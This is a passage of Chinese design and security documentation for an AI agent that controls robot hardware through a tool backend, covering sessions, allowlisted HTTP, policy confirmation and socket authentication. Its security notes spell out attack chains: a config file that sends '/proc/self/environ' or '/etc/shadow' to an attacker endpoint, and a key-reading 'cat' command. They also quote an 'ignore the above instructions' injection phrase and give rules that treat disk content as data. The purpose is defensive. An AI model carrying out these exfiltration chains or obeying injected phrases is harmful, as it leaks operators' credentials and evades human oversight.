不给 `--session-file` 时，对话历史**缺省就落盘**，按机器人归档并缺省续接上一次：

- **状态目录**：环境变量 `MYBOT_HOME` > `$HOME/.mybot`。首次运行自动逐级建目录（`0700`）。
  启动时把**实际落点**打印到 stderr（`会话落点: <路径>（新建 | 续接上一次；状态目录来源 …）`）。
- **布局**：`$MYBOT_HOME/robots/<机器人>/sessions/<UTC 时间戳>.jsonl`，另有 `sessions/latest`
  指针文件（`0600`）记「当前段」。`<机器人>` 取自结构脚本展示名，经安全归一（不安全字符
  折叠、数字开头补 `_`、超长截断，仅改写时追加指纹短哈希）。段文件以 `O_EXCL` 原子创建，
  同名冲突自动加 `-<pid>`／序号后缀。
- **缺省续接**：交互 REPL 与 `--task` 都**默认续接**该机器人最近一段（等价于把 `--resume`
  自动指向 `sessions/latest`）。要每次新开一段用 **`--new-session`**；它与 `--resume` 互斥，
  同给退出 2。
- **续接失败不中止**：缺省路径下，段头损坏 / 指纹不符 / 协议不自洽时**告警一次并自动新开
  一段**，旧段原样保留、进程退 0（现场重启不该被一份坏文件挡住）。显式 `--resume` 仍按上面
  「三道判据」报错退出 2——显式要求恢复却恢复不了，必须响亮失败。
- 显式 `--session-file <路径>` 的语义完全不变：本机制只作用于「不给路径」的缺省情形，
  且缺省布局没有显式路径的「已恢复/退出 2」概念（降级即新开段）。

```bash
# 缺省：跑完落 $MYBOT_HOME/robots/<机器人>/sessions/<时间戳>.jsonl，下次同机器人自动续接
./agent/target/release/mybot-agent --socket /tmp/mybot.sock --task "看看硬件"

# 想每次都从干净上下文开始
./agent/target/release/mybot-agent --socket /tmp/mybot.sock --new-session --task "看看硬件"

# 换状态目录（对话历史与 sim 地图都跟着走）
MYBOT_HOME=/var/lib/mybot ./agent/target/release/mybot-agent --socket /tmp/mybot.sock
```

## 远程对话（已评估，不做）

> **决策（2026-09-25）**：agent over TCP 远程 REPL **不做**——随 C++ agent 移除后
> 它曾规划由 Rust agent 承担（原批次 E），本次经维护者评估正式关闭，设计存档下架
> （历史全文见本决策提交之前的 git 历史）。远程场景回归既有路径：ssh 到机器人侧
> 本地运行 `mybot-agent`（stdin 交互）；动作脚本的远程投递走 `--tcp` 动作源
> （安全口径不变：回环缺省、跨机必须 `--tcp-token`）。批次字母 E 作废，不再复用。

决策存档（main 侧沿革记录）另见 [design/decisions.md](design/decisions.md)。

## 出站 HTTP：http_fetch

`http_fetch` 让模型对**操作者列出的少数几个受控主机**（内部 API、文档站点）发一次
HTTP GET。它是 **Rust 本地工具**：在 `mybot-agent` 进程里执行（`agent/src/httpfetch.rs`），
不经 C++ 后端——后端承诺零第三方 C++ 依赖，不引 HTTP 客户端；Rust 侧复用 rig 已带的
`reqwest`（钉同一版本、只开 `rustls`，不新增下载、不引入 openssl）。

```bash
# 只放行两个内部服务；不写端口 = 只放行 http/https 缺省端口
mybot-agent --socket /tmp/mybot/mcp.sock \
  --allow-host docs.internal.example --allow-host 10.0.0.5:8080 \
  --http-fetch-timeout 10 --http-fetch-max-bytes 65536 --task "查一下传感器手册里的量程"
```

`mybot-agent` 的三个选项（Rust 选项不进上面那张后端选项表，与其余 Rust 选项同体例）：

- `--allow-host <主机[:端口]>`：放行一个出站主机并注册 `http_fetch`，**可重复**；缺省不提供
  （无白名单 = 无此工具）。只写裸主机（可带端口；IPv6 写 `[::1]:8080`），带 scheme/路径/
  查询串/userinfo/通配符一律判配置错误退出 2。
- `--http-fetch-timeout <秒>`：单次请求超时（连接 + 整个响应），1..120，缺省 10。
- `--http-fetch-max-bytes <n>`：响应体上限，1..1048576，缺省 65536。

三个选项**只有命令行入口**：出站白名单是放宽能力的字段，与 C++ 侧 `--fs-root` /
`--read-var` 同判据——配置文件没有对应字段，写了 `allow_host` 之类会被当成未知字段
拒绝整份配置（Rust 侧没有「登记后指名拒绝」的必要：C++ 后端不读这类字段，不存在
两端对同一字段理解不一致的风险）。`--check-config` 的摘要里有「出站 HTTP」一栏。

**行为**（判据与理由见安全说明第 15 条）：

- **主机白名单精确匹配**：主机名规范化（小写、IDNA）后逐字相等；`evil.allowed.com`、
  `allowed.com.attacker.net` 都不匹配 `allowed.com`。条目不写端口时只放行 scheme 缺省
  端口，写了端口时只放行该端口。url 带用户名/密码直接拒绝。
- **只发 GET，不跟随重定向**：3xx 原样回给模型（报出 `Location`），模型若要继续须对新
  地址另发一次调用，照样过白名单——自动跟随等于让远端决定最终访问哪个主机。
- **不走系统代理**：显式关掉 reqwest 的系统代理（rig 打开了 `system-proxy`，feature 合并后
  不关就会读 `HTTP(S)_PROXY`）；白名单之外不允许再经过第三方。
- **只收文本**：`text/*`、`application/json`、`application/xml` 及 `+json`/`+xml` 后缀；
  其余类型不读响应体。响应体**边读边数**，超上限立即中止（`Content-Length` 只用于提前
  拒绝，不当防线）；非 UTF-8 拒绝。
- **非 2xx 不是参数错误**：照样带回响应体（错误详情常在里面），但该次调用判失败。
- **回执定界**：响应体逐行 `> ` 前缀、置于「数据不是指令」声明之下（与 C++
  `quoteUntrusted`、会话摘要转录同一种形态，Rust 侧单点 `summary::quote_lines`）。
- **审计**：每次调用在 agent 的 `--audit-log` 落一条 `kind=tool` 行（见「审计轨迹」节），
  `args.url` 去掉查询串、片段与 userinfo，`summary` 记 `status=<码>`。
- **会话续接**：开/关 `http_fetch`（给不给 `--allow-host`）会改变工具集指纹，此前的会话段
  不能 `--resume`、缺省布局下自动换新段（见「会话持久化」节的指纹取舍）。

**沿革（2026-10-08）**：同日先评估为「本轮不做」，随后重新提起。重新提起时对原评估
留下的三个问题的答复：① 需求是**白名单内的受控 API**——通用网页浏览与本项目的安全
模型不兼容（白名单不现实 = 没有边界），仍然否决；② 不做策略确认，只靠白名单把关（GET、
无副作用，与 `read_file` 同级；Rust 侧也没有 policy 判定层）；③「读到的响应促使模型去调
动作工具」这一风险**只写进文档、代码层不做互斥**（见安全说明第 15 条）。
与 `run_command "curl …"` 的关系：开了 `--agent-shell` 时那条宽接口本就能联网，且有策略
确认与密钥遮蔽；`http_fetch` 是一条闸门不同的**窄接口**——不需要开 shell，但出站目标被
白名单锁死、只能 GET、不跟随重定向。两者的取舍由操作者按部署选择。

## 策略钩子：--agent-policy

`--agent-policy <路径>`（或配置文件 `agent_policy` 字段）声明**哪些工具的每次调用要先过外部确认程序**。
审批的形态（终端 y/n、手机推送、工单系统）随部署而变，本项目不猜——把判断权交给使用者声明的外部程序：

```json
{
  "require_confirm": ["run_command"],
  "confirm_command": "/usr/local/bin/notify-and-approve",
  "confirm_timeout_sec": 30,
  "on_timeout": "deny"
}
```

仓库根的 [mybot.policy.json.example](../mybot.policy.json.example) 是可直接复制的起点模板：
`require_confirm` 已列全三件危险工具（多列无副作用——工具未开启时根本不存在），
`confirm_command` 是占位符，未换成本机确认程序前，命中确认的调用一律放不出去（fail-closed）。

- **确认协议**：命中 `require_confirm` 的工具在**执行之前**，宿主把
  `{"tool": "<工具名>", "args": {…}}` 写给确认程序的 stdin，按其**退出码**裁决——`0` = 放行，
  其他一律拒绝；参数先经密钥遮蔽（`run_command` 的 `command` 字段，与审计日志同一单点），
  因为确认程序的输出、截图、转发不受本仓控制。
- **超时**：确认程序 `confirm_timeout_sec`（1-86400，缺省 30）内不退出，按 `on_timeout` 处理
  （`deny` 缺省，与全仓 fail-closed 一致；可显式配 `allow`）；超时的进程组会被 SIGKILL 并回收。
- **拒绝的形态**：被拒的调用**没有副作用**，模型收到一句工具回执（含拒绝原因），
  工具循环照常推进——模型知道「没执行、为什么」，可以改道或提醒操作者；审计日志同样
  记一条 `ok:false, error:"policy_denied: …"`。
- **未开危险能力时可不启用**；后端开 `--agent-shell` / `--agent-hot-sql` 时，必须提供
  覆盖相应工具的 policy（见「安全模型」）。启用者承担「确认程序必须可靠」的责任；
  它退出非 0 / 被信号杀 / 超时时默认都是**拒**。
- **它不是安全边界**：确认程序与宿主同权限，能读宿主内存的攻击者同样能绕过它；
  真正的隔离仍是专用用户 / 容器 / 网络命名空间（见下节）。策略钩子提供的是
  「不用自己造轮子」的人在环入口，不是对抗边界。
- **确认程序的运行环境**（显式决策，别按 `run_command` 的口径「顺手统一」）：
  **环境不清洗**——确认程序是操作者自己写的可信程序，合法的审批/通知脚本可能依赖自有
  `…_TOKEN` 类变量，套用子进程的密钥清洗会**静默砸掉**它们；这条有钉子用例
  （`test_agentpolicy.cpp` 断言确认程序能看见 `BOT4CJ_LLM_KEY`）。
  同时**继承句柄吊销**——宿主 ≥3 的 fd 不进确认程序（HAL/驱动的器件句柄不渗给外部程序）。
  输出也不截断（直接进宿主终端，人在环的提示要看得见）。
- 策略文件与配置文件同一解析口径：严格 JSON、未知字段拒绝、类型/区间不符退出 2；
  `require_confirm` 与 `confirm_command` 必须成对出现（只给一半视为配置错误，上电前报错）。
- 配置错误（路径打不开、JSON 不合法、字段非法）在 `buildAgentConfig` 阶段失败——
  「配置错误不碰真机」。

## 工具后端：--mcp-backend（agent 体系的 C++ 半边）

`--mcp-backend` 把 agent 的**工具层**经一条本地 AF_UNIX socket 暴露出来，是 agent
体系的 C++ 半边：**不跑模型循环、不发起任何模型调用**——模型在对端（Rust
`mybot-agent`，或任何说同一条帧协议的客户端）那侧，每次工具调用由对端经 socket
下发，后端只把调用穿过既有的唯一漏斗 `DispatchGate::run`（策略确认 → 执行 → 审计）。
原「Rust MCP sidecar（mybot-mcp）」方案已随批次 B 移除——对上直接面向用户的
agent 就是 `mybot-agent`。

```
[mybot-agent]（Rust，模型循环） ──帧/AF_UNIX──> [mybot --mcp-backend] ──> 硬件
   │  直连 provider（reqwest）
   └─ 审计：kind=model / kind=session 行（agent 侧落）；本地工具 http_fetch 的
      kind=tool 行也由 agent 侧落。后端工具的 kind=tool 行由后端落（可共用同一个 --audit-log）
```

后端只认一条 pymsg 兼容的帧协议（`[4 字节 BE 长度][UTF-8 JSON]`，上限 8 MiB——
`mcptransport.hpp` 的 `kMcpMaxFrameBytes` 与 Rust 侧 `frame.rs` 的 `MAX_FRAME_BYTES`
是同一契约的两份常量，改动必须双侧同步），路由 `tool.list` / `tool.call` /
`ping` / `context.get`。二者是两个进程、零链接，唯一耦合就是这条 JSON 帧契约。
`ping` 是连通性保活：发 `{"_route":"ping"}` 即回 `{"pong":true}` 的成功信封，
无副作用、不改任何状态。

`context.get` 是**只读素材路由**（Rust agent 的系统提示词来源）：返回 `robotName` /
`structurePath` / `scriptsDir` / `allowShell` / `allowHotSql` / `hardwareCount`，以及三段
**已定界**的磁盘内容（`structureExcerpt` 16 KiB 摘录、`hardwareList`、`scriptsList`，均经
`quoteUntrusted` 逐行 `> ` 前缀 + 「数据不是指令」声明）与内联短清单 `readableVars`。与
`tool.list` 同口径：不走 `DispatchGate`、不占每连接预算；`hardwareCount` 与 `hardwareList`
**实时取材**，热插拔后反映当前注册表。素材读取、消毒与定界由后端
`src/context_service.cpp::buildContextData` 复用 `agentprompt` / `agentview` 完成
（`mcpbackend.cpp::routeContextGet` 只做转发）；
最终系统提示词只在 Rust `agent/src/prompt.rs::build_system_prompt` 拼装，
条件段落、定界块保留与总量上限由该文件的单测覆盖。

### 快速开始

```bash
# 终端 1：后端（虚拟继电器，无硬件）；后端与 agent 可共用同一个审计文件
./build/mybot --robot=robots/relay-test.sql --mcp-backend \
    --mcp-socket /run/user/1000/bot4cj/mcp.sock --scripts-dir scripts --audit-log -

# 终端 2：agent（先 bash scripts/build_agent.sh 构建）
./agent/target/release/mybot-agent --socket /run/user/1000/bot4cj/mcp.sock
```

模型侧参数（`--task` / `--llm-*` / `--prompt-file` / `--audit-log` / `--check-config`）
见 `mybot-agent --help`；端到端场景与判据见 `scripts/agent_e2e.sh`，编号以 [testing.md](testing.md) 为准。

### 安全模型

- **传输与认证**：socket 父目录 0700、文件 0600；accept 后用内核 **`SO_PEERCRED`** 校验对端
  uid/gid == 本进程，不匹配即断连（不可伪造）。`BOT4CJ_MCP_TOKEN` 非空时叠加**首帧共享密钥**
  （见下方「首帧共享密钥」节）。mybot-agent 与后端同 uid，由操作者启动。
- **线程归属**：后端在**主线程同步**服务、**单连接串行**（lock-step）——于是工具执行依赖的
  `thread_local`（`callEchoSink`/`topDepth`/`luaExecBudget`）天然正确，硬件调用自动串行。
- **审计/策略连续性**：所有 MCP 调用**必穿** `DispatchGate::run`，故审计与能力门控与 agent
  模式**逐字节一致**；`tool.list` 只宣告已放行的工具（未开 `--agent-shell` 则 `run_command`
  根本不出现）。整个后端进程记**一个** session（start/end），每次工具调用各记一条。
- **强制外部确认（折中）**：后端开 `--agent-shell`（run_command）或 `--agent-hot-sql`（apply_sql）时，
  **强制**要 `--agent-policy`，且其 `require_confirm` 必须分别包含 `run_command` / `apply_sql`，
  否则 `buildAgentConfig` 拒绝启动（配置错误不碰真机）。纯只读 / 查询 / 动作脚本后端不受此约束。
- **agent 侧断连重连（2026-09-30，审计 P1）**：传输失败（I/O/读超时/超限）后 agent 把连接
  判死，**下一次调用**前透明重连（connect 退避 30s + 按需重走首帧认证，`bridge::Conn`）——
  后端中途重启不再要求 agent 跟着重启。**在途调用绝不重试**：回执丢失的 `tool.call` 可能已在
  后端执行，重发即重复物理动作；判死的那次调用如实报错给模型，lock-step 物理安全语义不变。
- **每连接预算再强制**：后端不假设调用方是 agent loop，故自行再强制一层跑飞护栏——
  `--mcp-call-budget <N>` / `--mcp-wall-clock <秒>`（0/空 = 不限）。超限的调用**在派发前**被拒
  （无副作用）。注意**单次**物理调用的 `scriptTimeoutSec`/`commandTimeoutSec` 始终在工具层生效，
  与这层「整连接总量」护栏是不同维度。
- **空闲连接收口**：`--mcp-idle-timeout <秒>`（0/空 = 不限，缺省不限）让「连上后一声不吭」的
  哑连接按时断开让位（单连接串行模型下它占着唯一的 accept 槽）；墙钟预算同样在空闲期收口
  （到点断连，对端可重连）。缺省不限是刻意的：REPL 两次工具调用之间（人在思考、模型长推理）
  可能空闲很久。另：启动时若 socket 路径上已有**活着的**后端实例（探测 connect 成功即判定），
  本进程会响亮拒绝启动而不是抢走 socket 文件（防双实例静默劫持）。
- **断连安全动作**（2026-09-25，`--on-disconnect <脚本>`）：**被服务连接**结束——对端正常关闭、
  agent 进程崩溃/被杀、空闲或墙钟超时、协议违规、回帧发送失败，任何原因——后端随即自行执行操作者
  预设的动作脚本（`--scripts-dir` 之下的相对路径，如 `zero.mt`），把硬件带到安全姿态。**未通过认证的
  连接不触发**（2026-10-01 审计收口：设了 `BOT4CJ_MCP_TOKEN` 时，探连「连上就断/认证帧未到」与认证
  失败从未进入业务循环，不执行动作、后端日志点名跳过——否则同 UID 对端反复 connect+close 可反复
  驱动执行器，连败 5 次还会借停机断电链把后端打停）。缺省不执行：此时硬件停在
  **最后一个姿态**带电常驻，直到操作者干预。设计要点：
  - 脚本在**上电前预检**（`buildAgentConfig` 第 11c 步，判据与 `run_action_script` 同源：越界 / 不存在 /
    为空即退出 2）——脚本名拼错不该等到第一次断连、也就是最需要它的那一刻才发现；
  - **不经 `DispatchGate` / 策略确认**：`require_confirm` 是给「模型想做什么」设的闸门，这是操作者的
    配置、不是模型的请求，等外部确认反而违背它的目的；
  - 执行走同一份 `runActionScriptFile`（沙箱 / 8 MiB 上限 / `action_script_timeout_sec` 预算 / 回显回收），
    失败**只记日志 + 审计**（`kind=session, status=disconnect_action, summary=<脚本>`，失败带 `error`），
    后端继续 accept——退出即摘电固然也「安全」，但会把操作者的重连机会一起带走；
  - SIGINT/SIGTERM 停机**不触发**（`stopRequested()` 时跳过）：那条路由 `deactivate()` 的断电清理链负责；
  - 对端连接**先关**再跑脚本（半关闭的对端看不到动作期间的任何回帧，也不占着 fd）；
  - **只能命令行给**（它决定断连后硬件做什么，与 `--agent-shell` 同判据，配置文件不能给）；
  - 边界与「急停」一节相同：脚本本身是新的下发，打不断**正在**阻塞的 FFI 系统调用。

### 急停与取消（请务必理解其边界）

- **优雅停机 = 急停**：`SIGTERM`/`SIGINT` 置停止标志，后端跳出 accept/帧循环、回到 main 的
  清理链**总是 `deactivate()`**（fail-safe 断电），与 agent 模式同一兜底。
- **但进行中的硬件动作停不了**：`run_action_script` 的预算钩子是 LuaJIT 指令计数钩子，
  **打不断阻塞的 FFI 系统调用**（已下发到 I2C/SPI/UART 的动作收不回）。对端（mybot-agent）
  的取消因此只「停止后续派发与模型轮」并**如实回报**「执行被中断」——绝不假装硬件停了。

### ⚠ 残留风险（诚实告知）

`SO_PEERCRED` 只挡**别的用户**，挡不住**同 uid** 的进程——而后端的 `run_command`（模型驱动的
shell）恰恰同 uid。理论上它若发现 socket 路径，就能直连后端、**绕过 mybot-agent 循环层的
物理安全上限**（单轮调用数、任务预算等在循环里强制，直打 socket 就跳过了）。已就位的缓解：
listening fd 是 CLOEXEC
（`run_command` 子进程不继承）、0700 目录 + 不可预测路径、每连接预算、危险能力强制 policy 确认、
**首帧共享密钥 `BOT4CJ_MCP_TOKEN`（2026-09-29 起实现，见下）**。
**诚实建议**：后端模式下**尽量不要开 `--agent-shell`**；若必须开，把后端跑在**专用用户 / 容器**里
（真正的隔离），或设置 `BOT4CJ_MCP_TOKEN`。详见 `src/mcpbackend.hpp` 顶部注释。

### 首帧共享密钥（BOT4CJ_MCP_TOKEN，2026-09-29）

环境变量 `BOT4CJ_MCP_TOKEN` 非空时，两个进程**读同一个变量**：后端在宿主环境抹零前捕获
（`captureMcpAuthToken`，设置但为空/超 256 字节 = 配置错误退出 2），agent 连接后的第一帧发
`{"_route":"auth","token":...}`（`frame.rs` 的 `authenticate`），常数时间比对，失败即断连并落
审计 `auth_failed`。未设置则退回「仅 SO_PEERCRED」的旧行为（残留风险同上一节）。密钥只进两个
进程的内存：名字含 `token`，被 `run_command` 的环境清洗自动剔除；宿主与 agent 各自
`prctl(PR_SET_DUMPABLE, 0)` 后 `/proc/<pid>/environ` 对同 uid 不可读。**版本配对**：不支持
auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提示两侧须同升/同不设），带
密钥的新后端对不先认证的旧 agent 同样拒绝。**连续失败门（2026-09-30，审计 P1）**：首帧认证
连续 5 次失败后端即停止服务（`AuthFailGate`，与 TCP 口令的 `authMaxFails=5` 同口径；哑对端
「连上不发帧」不动计数、认证通过才归零——试探者无法用「连了就断」刷新失败窗口）。到顶走正常
停机断电链（fail-closed），操作者重启后端恢复、必要时更换密钥。回归：`test_mcptransport` 的
`mcpbackend_auth_fail_gate_counts_consecutive_rejections`。其余回归：`test_mcpbackend` 三态单测、
`mcp_e2e.sh` M6（正确/错误/无认证帧/空密钥拒启）、`agent_e2e.sh` R17（两进程正反两面）。

## 安全说明（请务必读）

1. **`run_command` 是无命令白名单的任意 shell 执行，但后端强制要求 policy 确认**。
   它缺省不注册，只能由后端命令行 `--agent-shell` 授权；配置文件不能自行开启。
   同时必须提供 `--agent-policy`（或后端配置的 `agent_policy`），且 `require_confirm`
   包含 `run_command`；`--agent-hot-sql` 同理必须覆盖 `apply_sql`，否则上电前拒绝启动。
   模型仍可能被外部输入诱导执行任意命令；确认程序须可信，超时缺省拒绝（可显式改为放行）。
   policy 不是隔离边界：需要对外暴露时仍须专用用户 / 容器 / 网络命名空间。
2. **后端保留两道环境防线**（2026-09-20 审计 A 收口）：
   ① `run_command` 的子进程环境按**整词**清洗——名称含 `key` / `token` / `secret` / `password` /
   `passwd` / `credential` 的变量不传给子进程（`BOT4CJ_LLM_KEY` 天然落在内，`KEYSTONE`/`MONKEY` 不误伤）；
   ② C++ 后端抹掉自己 exec 时环境块中的敏感串；旧 C++ agent 曾先注入模型密钥再抹零。
   **这些防线不覆盖独立 Rust 进程的环境**——Rust 进程的内存与 `/proc/<pid>/environ` 由第 3 条的
   `PR_SET_DUMPABLE=0` 挡住同 uid 读取，但仍不能推断同 uid 的 shell 拿不到密钥（落盘来源见下）。
   **落盘来源仍是明文可读**：密钥若来自配置文件（`api_key` 字段）或密钥文件（`api_key_file`），
   同用户 shell 可直接读出，`chmod 600` 对此无效。后端不解析模型密钥来源，不能再依赖旧
   C++ agent 的「启用 shell 且密钥来自文件」启动告警。
   **③ 回执的第三道防线（2026-09-23 审计 G1）**：子进程环境清洗挡不住「命令自己把密钥打印到
   stdout/stderr」——模型让命令执行 `env`、`cat` 配置文件、或任何打印 `KEY=value` 的输出，都会经
   回执带回模型上下文，再由同一配置可控的 `endpoint` 外发。因此 `run_command` 的**回执文本**在回传
   模型**之前**也会过一次敏感值遮蔽（与审计日志的 `args.command` 是同一个 `maskSecretsInText` 单点：
   `KEY=VALUE` / `Authorization: Bearer <tok>` / 裸 `Bearer <tok>` / JSON 引号键 `"name": value` 四种形态）。
   最后一种是 2026-10-08 审计 P1 续发现并补上的：本仓真实密钥的落盘形态（`mybot.llm.json`、会话 JSONL）
   恰恰是带引号的键名，旧的三种形态判据在遇到键名前导的 `"` 时根本进不了识别分支——意味着 `cat
   mybot.llm.json` 这个最直觉的读密钥命令，从 2026-09-23 G1 落地起就从未被真正遮蔽过，只是没人拿
   真实 JSON 内容去测过。遮蔽是**有损**的：
   一旦发生替换，回执末尾会追加一句「已净化」提示，让模型知道结果被改过、不要据此假定原值。
   注意这仍是**文本级**防线（把值 base64/编码后打印即可绕过），与上面两道同档——真要对抗恶意 shell，
   仍须把 agent 放进专用用户 / 容器（见本节第 3 条末）。

3. **模型 API key 由 Rust 直接读取**：`agent/src/config/`（环境变量链在 `mod.rs`，
   文件内联与 `api_key`/`api_key_file` 在 `file.rs`）取密钥，`provider.rs` 用于请求头；不经后端工具参数、Lua 驱动或
   `BOT4CJ_DEBUG` 转储，两端均无命令行传密钥的入口。
   - 环境变量链：`BOT4CJ_LLM_KEY` → `ROBOT_AGENT_API_KEY` → `DEEPSEEK_API_KEY`，再回退到 Rust 配置文件的 `api_key` / `api_key_file`。
   - **两进程都不可 dump**（2026-09-25）：`mybot` 与 `mybot-agent` 进入 `main` 的第一件事是
     `prctl(PR_SET_DUMPABLE, 0)`——在解析 argv、读配置之前。效果：同 UID 的其他进程不能
     `ptrace` 附着（gdb/strace attach 得到 EPERM），`/proc/<pid>/environ`、`mem`、`maps` 等
     变为 root 属主不可读，崩溃不落 core。边界如实：**root / `CAP_SYS_PTRACE` 不受影响**，
     `/proc/<pid>/cmdline` 仍全机可读（所以 `--tcp-token` 仍推荐走环境变量），密钥的**落盘
     来源**（配置文件 / 密钥文件）与本步无关。调试需要 attach 时设 `BOT4CJ_ALLOW_PTRACE=1`
     （两进程各打一行「注意」）；sanitizer 构建编译期跳过（LeakSanitizer 需 ptrace 自身）。
   - **同 UID 仍不构成隔离**：上面这一步挡的是「读运行中进程的内存」这一条路；同 UID 的 shell
     仍能读密钥文件、改配置、替换驱动 `.lua`、以相同环境重新拉起 agent。想同时挡住其他本机用户
     与 agent 自己的 shell，得把 agent 放进**专用用户 / 容器 / 网络命名空间**。
   - 落盘的密钥请 `chmod 600`，启动时对「同组/其他用户可读」会打印提醒，仓库 `.gitignore` 已挡住 `mybot.llm.json` 一类文件名
   - 曾有的 `--llm-key` 已移除：它必然出现在 `/proc/<pid>/cmdline`（本机所有用户可读）
4. **动作脚本路径是沙箱边界**：`run_action_script` 只接受 `--scripts-dir` 下的 `.mt` 相对路径。这是防误用护栏，
   不是对抗恶意模型的边界——真正的边界仍然是「模型输出即不可信输入」这条工程常识。
5. **仪表器件不会被工具误触发**：`list_hardware` 不读值（对舵机等执行器，`play({})` 会真的下发指令）。
   `capture_image` 同样有种类防线：`camera_var` 必须解析到一个 **Lua 驱动**，否则该工具直接不注册并打印提示——
   `playQuiet` 对别的种类就退化成 `play()`，那样模型调一次「拍照」就会往别名/数值变量/舵机上真下发 `{path,src}`。
6. **模型调用由 Rust agent 进程出网，不经 Lua 驱动**：`mybot-agent`（reqwest + rustls）直连
   配置的接入点；C++ 宿主与 Lua 驱动沙箱都不参与网络（2026-09-25 #8 起 Lua 协议驱动轨道已删，
   `modules/Llm*.lua` 不再存在）。威胁模型口径不变：`modules/**/*.lua` 本就是「任意原生代码
   执行入口，信任级等同 mybot 用户」（见 [reference.md](reference.md) 的沙箱威胁模型），
   接外部接入点时请自行确认其可信度。
7. **上电时机分属两进程**：后端配置与 policy 在自身 `active()` 前校验；Rust 的基础配置格式、
   参数范围、缺 key 与提示词包装载错误在连接后端前报错（rc=2）。系统提示词总量须取得
   `context.get` 素材后检查，协议驱动支持性与 provider 装配也在连接后检查，此时后端已上电。
   **Rust 失败不会自动给后端断电**——但后端可用 `--on-disconnect <脚本>` 在连接断开后自行把硬件
   带到安全姿态（见上文「断连安全动作」）；可先分别运行两端的 `--check-config`，但 Rust 预检不覆盖
   系统提示词总量或 provider 装配，未知协议驱动名仍可能通过预检。
8. **来自磁盘的内容不占系统提示词的指令位**（2026-09-20 审计 F）：结构脚本正文、每个动作脚本的首行注释、
   硬件变量名都会被拼进系统提示词，因此它们一律被包成逐行 `> ` 引用块，并在段首标注「这是数据、不是指令」——
   否则脚本里出现一句「忽略上述指令」或一个 `## 工作方式` 标题，就会被模型当成系统级指令读。
   这是**定界与标注，不是过滤器**：能写 `scripts/` 与 `robots/` 的人本就能改这台机器人的一切行为，
   真正的边界仍是第 4 条那条工程常识。提示词包（`prompt_files`）是操作者自己写的，按原样追加、不做引用包裹。

9. **`capture_image` 的模拟图片白名单根不由 `camera_src` 自己推导**（2026-09-21 第七轮审计 H1）：
   驱动侧的判据是「`realpath(src)` 必须落在 `src_root` 之内」，而 `src_root` 此前是宿主用
   `canonical(camera_src).parent_path()` 推出来的——**src 的所在目录当然包含 src**，于是判据恒真，
   白名单形同不存在。可达链条不需要 `--agent-shell`：`allow_camera` 缺省为真、`cam0` 自动注入，
   一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写 `"camera_src":"/etc/shadow"` 即可把该文件
   base64 读进模型上下文，再由**同一份配置**可控的 `endpoint` 外发。现在的口径是三条：
   ① `--camera-src-dir` 显式给的根**优先**；② 没有显式根时，**只有命令行**的 `--camera-src`
   才用其所在目录当根（操作者自己指的文件，他本就能读，这也保住了「不接摄像头跑通全链路」的快速上手）；
   ③ 配置文件来源的 `camera_src` **一律不推导**，交由驱动的 `BOT4CJ_CAMERA_SRC_DIR` 判定，
   两者都没有即默认拒绝（`Camera.lua` 的「仿真图片未放行」文案）。
   `camera_src_dir` 因此是**命令行独占**字段：它放宽读权限，与 `allow_shell` 同判据
   （配置文件只能收紧不能放宽），写在配置文件里会被拒绝加载并退出 2。

10. **`apply_sql` 让模型的一次回复直接改变带电的硬件结构**（2026-09-23 热插表）。它比
    `run_command` 更贴近「改这台机器人本身」：新表即 `modules/<表名>.lua` 驱动（表名决定模块
    解析路径），新变量即真机开 fd 供电。因此它与 `run_command` 走同一条门控链——**缺省不注册，
    只能用命令行 `--agent-hot-sql` 开启**，配置文件写 `allow_hot_sql: true` 会被拒绝加载
    （理由同第 1 条：缺省查找会读 CWD 的 `./mybot.llm.json`）。
    热插路径另有三道自有判据（不依赖操作者自律）：表名与列名必须通过安全标识符校验（挡
    `../` 目录穿越与 `@Daemon` 配置串注入）、驱动模块必须已存在于模块路径下、守护行的 `chunk`
    必须是模块路径下的相对路径。这些校验**全部只读**，通过后才提交；提交中任一步失败即整批
    回滚（逆序断电 + 注册表回退到批次前的水位），不让系统停在「一半器件已上电」的半成品状态。
    只读的 `query_sql` 不受这条门控影响。

    同一门控下还有**热删除**（`DELETE FROM ... [WHERE ...]`）与**整表撤下**（`DROP TABLE ...`，
    均 2026-09-23），但危险性质不同：
    热插/INSERT 是可回滚的加法，而 `DELETE` 走 `destroy()` —— **物理断电，没有回滚**
    （回滚 ≠ 复活器件）。因此它的防线不靠「事后撤销」而靠「**事前判全**」：
    - 全部校验（目标表存在、行能命中、**引用完整性**、全结构判据）都在**动第一个器件之前**
      跑完，任一失败即整批拒绝、活体一字未动；过了这道关，剩下的失败只可能来自物理
      `destroy` 本身。
    - 引用完整性是新增的关键判据：被别的行以 `controller`/`trigger`（含 `controller2` 这类
      编号列）、`$name` 或 `$(...)` 表达式引用着的变量**拒绝删除**并点名引用方。理由不是保守，
      而是这些引用在框架内部是**终身缓存的裸指针**（`MtVars_Lua::ctrlPtrs_`/`trigPtrs_`
      首用缓存、`MetaRef::target` 在装配期锁定），删掉被引用者即悬垂指针——静默 UB 换不来
      任何好处。判据看的是**删除之后**的视图，故「引用方一起删」是允许的。
    - 物理 `destroy` 中途失败时**立即中止**后续删除并如实报出「已删 N 个（名单）、M 个未删」，
      结构与注册表只反映已成功摘除的部分——不假装回滚，也不继续硬闯叠加失败。
    - 条件命不中任何行时**报错**而不是静默成功：模型/操作者拿到「已生效」却什么都没发生时，
      无从判断是条件写错还是器件本就不在（拼错 name 的 DELETE 会让人以为器件已摘除）。
    - 删除后 `flowRefs_` 里的名字一并摘除，故「删掉再热插同名变量」是一条合法恢复路径。

11. **配置文件里的 `prompt_files` 不是「读任意文件」的原语**（H2，2026-09-23 第八轮审计）。
    提示词包的内容会进系统提示词、随**首个**模型请求发往 endpoint，而 endpoint 同样由
    配置文件决定；读取又走 `read()` 循环（`util::readFileCapped`，不依赖 `stat` 长度），
    因此 **`/proc/self/environ` 这类伪文件照样读得到**。合起来是一条不需要任何开关的链路：
    一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写
    `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}`，就能把操作者的环境块
    （其中就有宿主重新注入的 `BOT4CJ_LLM_KEY`）整块外发——不需要 `--agent-shell`，也不
    需要摄像头。这与第 9 条的 `camera_src` 是**同一族**（「配置文件不该授予读权限」），
    故同判据：
    ① **命令行** `--prompt-file` 不受限（操作者自己指的文件，他本就能读，也保住了
    `--prompt-file prompts/spider_robot/` 的快速上手路径）；② **配置文件来源**的每一项
